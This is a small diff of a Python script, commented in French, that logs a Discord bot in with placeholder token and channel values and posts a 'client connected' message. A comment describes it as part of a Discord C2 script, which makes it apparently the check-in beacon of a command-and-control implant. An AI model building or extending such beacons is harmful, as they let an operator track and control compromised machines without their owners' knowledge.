@@ -1,22 +1,21 @@
-import os
 import discord
 
-# Récupère le token Discord et l'ID du canal Discord depuis les variables d'environnement
-TOKEN = os.getenv('$tk')
-CHANNEL_ID = os.getenv('$ch')
+# Récupère le token Discord et l'ID du canal Discord depuis le script Discord C2
+token = "$tk"  # Remplace ça par le token de ton bot Discord
+chan = "$ch"  # Remplace ça par l'ID du canal Discord où tu veux envoyer le message
 
 # Initialise le client Discord
 client = discord.Client()
 
 # Définit la fonction pour envoyer un message sur Discord
 async def send_message_to_discord():
-    channel = client.get_channel(CHANNEL_ID)
+    channel = client.get_channel(int(chan))
     await channel.send("client connécté")
 
 # Fonction principale pour envoyer le message
 async def main():
     # Connexion au bot Discord
-    await client.login(TOKEN)
+    await client.login(token)
     await send_message_to_discord()
     await client.logout()
 
